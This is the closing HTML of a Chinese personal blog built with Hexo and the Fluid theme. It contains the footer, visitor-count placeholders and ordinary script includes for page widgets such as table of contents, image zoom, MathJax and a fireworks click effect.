       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>
 
  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>Copy
</body>
</html>

<!--浏览器搞笑标题-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--鼠标点击礼花特效-->
<script async src="/js/fireworks.js"></script>